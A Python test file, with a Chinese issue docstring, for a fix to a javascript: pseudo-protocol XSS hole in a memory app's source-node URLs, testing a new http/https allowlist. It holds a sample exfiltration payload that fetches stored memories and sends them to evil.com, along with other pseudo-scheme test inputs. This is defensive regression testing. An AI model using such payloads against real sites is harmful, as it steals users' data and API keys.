"""票 69：星图来源节点 window.open 伪协议洞——入库双口 url 零 scheme 校验。

`.scratch/v0.68-next-window-2026-11/issues/69-map-source-url-protocol-hole.md`

**先说影响**（五跳链，每跳亲读）：

| 跳 | 位点 | 现状 |
|---|---|---|
| 入库一 | `lantai/ingestion/rss.py:33` `url=e.get("link", "")` | feed 作者完全可控字段原样入库；同文件 SSRF 门只校验 feed 源地址 |
| 入库二 | `lantai/services/memory_service.py` 两处 RawDocument 站点 `url=req.url` | `POST /add` 携 `javascript:` 直存；`source_id=req.url or h[:12]` 同污染 |
| 出口 | `lantai/ops/graph.py:170` `"url": d.url or None` | 星图 /graph 响应原样透传 |
| 执行 | `lantai/api/routes_ui.py` 点击处理器 `window.open(n.url)` | 无 scheme 白名单，伪协议同源 JS 执行 → 读 localStorage API Key |

**修法**：`lantai/ingestion/safety.py` 新增 `sanitize_source_url` 白名单助手
（scheme ∈ `SSRF_ALLOWED_SCHEMES` 即 http/https 且必须有 hostname，不合格式置空 +
warning——宁 miss 不脏写）；入库双口与 graph 出口同闸，UI 点击处理器加
`/^https?:/i` 前缀纵深。

**mock 边界声明**（AGENTS.md 测试纪律）：仅 RSS 臂的 `fetch_with_safety` 打桩——
那是外部网络取 feed 源（豁免口径），feedparser 解析与 RawDocument 组装是真链路；
add 臂的提取路径走 `extract_candidate` 真实离线 fallback（无 API key 即低置信
兜底），全程零 mock；出口臂 `add_raw_memory` 零 LLM 直调。
"""

from __future__ import annotations

import hashlib

import pytest
from sqlmodel import Session, SQLModel, create_engine
from sqlmodel.pool import StaticPool

from lantai.models.schemas import AddMemoryReq, RawMemoryReq
from lantai.models.tables import MemoryEdge, RawDocument
from lantai.services.memory_service import add_memory, add_raw_memory
from lantai.storage import db

EVIL_URL = (
    "javascript:fetch('/memories?limit=50').then(r=>r.text()).then(t=>fetch('https://evil.com/'+t))"
)
GOOD_URL = "https://example.com/post/1"
FASTPATH_EVIL = "我叫老周69号，是后端工程师，负责检索链路"
FASTPATH_GOOD = "我叫老周70号，是前端工程师，负责星图链路"
EXTRACT_EVIL = "基线摄取样本69号：alpha项目检索的季度复盘纪要与后续动作清单"

RSS_FEED = (
    '<?xml version="1.0"?>'
    '<rss version="2.0"><channel><title>t69-fixture</title>'
    "<link>https://feed.example.com/</link><description>d</description>"
    f"<item><title>evil</title><link>{EVIL_URL}</link>"
    "<description>bad entry</description></item>"
    f"<item><title>good</title><link>{GOOD_URL}</link>"
    "<description>good entry</description></item>"
    "</channel></rss>"
)


@pytest.fixture()
def db_env(tmp_path, monkeypatch):
    """真 SQLite 内存库（StaticPool 单连接）+ 真实临时 ChromaDB；coalesce 显式关。

    同 test_fastpath_dup_content_hash.fp_env 口径：add_memory/add_raw_memory
    真链路（去重向量库为真、FTS 为真），只是库与向量目录指向测试实例。
    """
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    monkeypatch.setattr(db, "engine", engine)
    SQLModel.metadata.create_all(engine)
    # add_raw_memory 写后 sync_fts → FTS 虚表必须真建（conftest 同款口径）
    from lantai.storage.fts import init_fts

    with engine.connect() as conn:
        init_fts(conn.connection.driver_connection)
    monkeypatch.setattr("lantai.core.settings.settings.COALESCE_ENABLED", False)

    monkeypatch.setattr(
        "lantai.core.settings.settings.CHROMADB_PATH", str(tmp_path / "chroma_url69")
    )
    import lantai.storage.vector_store as vs_mod

    monkeypatch.setattr(vs_mod, "_store", None)
    from lantai.storage.vector_store import get_vector_store

    fresh_vs = get_vector_store()
    monkeypatch.setattr("lantai.services.memory_service.get_vector_store", lambda: fresh_vs)
    return engine


class TestSanitizeSourceUrl:
    """修复目标 1 的判定核：白名单助手本体（http/https 且必须有 hostname）。"""

    def test_https_urls_pass_through(self):
        from lantai.ingestion.safety import sanitize_source_url

        assert sanitize_source_url("https://example.com/post/1") == "https://example.com/post/1"
        assert sanitize_source_url("http://10.0.0.8:8080/a?b=1") == "http://10.0.0.8:8080/a?b=1"
        assert sanitize_source_url("HTTPS://EXAMPLE.COM/UP") == "HTTPS://EXAMPLE.COM/UP"
        assert sanitize_source_url("  https://example.com/s  ") == "https://example.com/s"

    def test_pseudo_schemes_rejected_with_warning(self, caplog):
        from lantai.ingestion.safety import sanitize_source_url

        with caplog.at_level("WARNING", logger="lantai"):
            assert sanitize_source_url("javascript:alert(1)") == ""
            assert sanitize_source_url("data:text/html,<script>1</script>") == ""
            assert sanitize_source_url("vbscript:msgbox") == ""
            assert sanitize_source_url("ftp://example.com/f") == ""
            # 必须有 hostname：scheme 合法但无宿主同样拒收
            assert sanitize_source_url("https://") == ""
            assert sanitize_source_url("not-a-url") == ""
            assert sanitize_source_url("") == ""
        assert caplog.records, "拒收时应记 warning（修复目标 1）"


class TestRssEntryLinkScheme:
    """修复目标 1（TDD 要求 1）：真 RSSAdapter.fetch——feed 条目 link 过白名单。

    fetch_with_safety 打桩=外部网络取 feed 源（豁免口径）；feedparser 解析、
    条目遍历与 RawDocument 组装均为真链路。fixture feed 已真跑实证：
    feedparser 对 <link>javascript:…</link> 原样透传。
    """

    def test_javascript_link_rejected_https_kept(self, monkeypatch):
        import lantai.ingestion.rss as rss_mod

        monkeypatch.setattr(rss_mod, "fetch_with_safety", lambda url: RSS_FEED.encode())
        docs = rss_mod.RSSAdapter().fetch({"url": "https://feed.example.com/rss"})
        by_title = {d.title: d for d in docs}
        assert set(by_title) == {"evil", "good"}, f"fixture 条目缺失：{sorted(by_title)}"
        assert by_title["evil"].url == "", (
            f"伪协议条目 url 未置空（现状红）：{by_title['evil'].url!r}"
        )
        assert by_title["good"].url == GOOD_URL, "合法 https 条目被误伤"


class TestAddUrlScheme:
    """修复目标 1（TDD 要求 2）：POST /add 双写点（fastpath 直写 + 提取路径）同白名单。"""

    def test_fastpath_add_javascript_url_rejected(self, db_env):
        out = add_memory(
            AddMemoryReq(title="自我声明 69", content=FASTPATH_EVIL, lane="profile", url=EVIL_URL),
            user_id="default",
        )
        assert out.get("fastpath") is True, f"句子脱靶未走直写：{out}"
        with Session(db_env) as s:
            doc = s.get(RawDocument, out["document_id"])
            assert doc.url == "", f"RawDocument.url 原样入库（现状红）：{doc.url!r}"
            assert doc.source_id == doc.content_hash[:12], (
                f"source_id 未回退 h[:12] 而是伪协议串：{doc.source_id!r}"
            )

    def test_fastpath_add_https_url_kept(self, db_env):
        out = add_memory(
            AddMemoryReq(title="自我声明 70", content=FASTPATH_GOOD, lane="profile", url=GOOD_URL),
            user_id="default",
        )
        assert out.get("fastpath") is True
        with Session(db_env) as s:
            doc = s.get(RawDocument, out["document_id"])
            assert doc.url == GOOD_URL, "合法 https url 被误伤"
            assert doc.source_id == GOOD_URL

    def test_extraction_path_javascript_url_rejected(self, db_env):
        """第二写点（提取路径）：extract_candidate 走真实离线 fallback，零 mock。"""
        from lantai.parsing.fastpath import fastpath_check

        assert not fastpath_check(EXTRACT_EVIL), "对照句意外命中 fastpath——臂失效"
        out = add_memory(
            AddMemoryReq(title="基线摄取 69", content=EXTRACT_EVIL, lane="fact", url=EVIL_URL),
            user_id="default",
        )
        assert "fastpath" not in out, f"未走提取路径：{out}"
        with Session(db_env) as s:
            doc = s.get(RawDocument, out["document_id"])
            assert doc.url == "", f"提取路径写点未过白名单（现状红）：{doc.url!r}"


class TestGraphExitSanitized:
    """修复目标 2（TDD 要求 3）：出口与入口同闸——直写库的历史脏行在 /graph 出口被拦。"""

    def test_source_node_url_sanitized_on_exit(self, db_env):
        mem = add_raw_memory(RawMemoryReq(content="星图出口臂锚点记忆69号"), user_id="default")
        with Session(db_env) as s:
            s.add(
                RawDocument(
                    id="doc-evil-69",
                    source_type="article",
                    source_id="evil-69",
                    url=EVIL_URL,
                    title="evil doc",
                    lang="zh",
                    content_hash=hashlib.sha256(b"evil-69").hexdigest(),
                    content="evil",
                )
            )
            s.add(
                RawDocument(
                    id="doc-good-69",
                    source_type="article",
                    source_id="good-69",
                    url=GOOD_URL,
                    title="good doc",
                    lang="zh",
                    content_hash=hashlib.sha256(b"good-69").hexdigest(),
                    content="good",
                )
            )
            s.add(
                MemoryEdge(
                    id="edge-69a",
                    source_memory_id=mem["memory_id"],
                    target_memory_id="doc-evil-69",
                    relation="leads_to",
                )
            )
            s.add(
                MemoryEdge(
                    id="edge-69b",
                    source_memory_id=mem["memory_id"],
                    target_memory_id="doc-good-69",
                    relation="leads_to",
                )
            )
            s.commit()

        from lantai.ops.graph import build_graph

        g = build_graph(Session(db_env), principal=None)
        urls = {n["id"]: n["url"] for n in g["nodes"] if n["node_type"] == "source"}
        assert "doc-evil-69" in urls and "doc-good-69" in urls, f"来源节点未入图：{urls}"
        assert urls["doc-evil-69"] is None, f"出口未净化（现状红）：{urls}"
        assert urls["doc-good-69"] == GOOD_URL, "合法来源节点 url 被误伤"
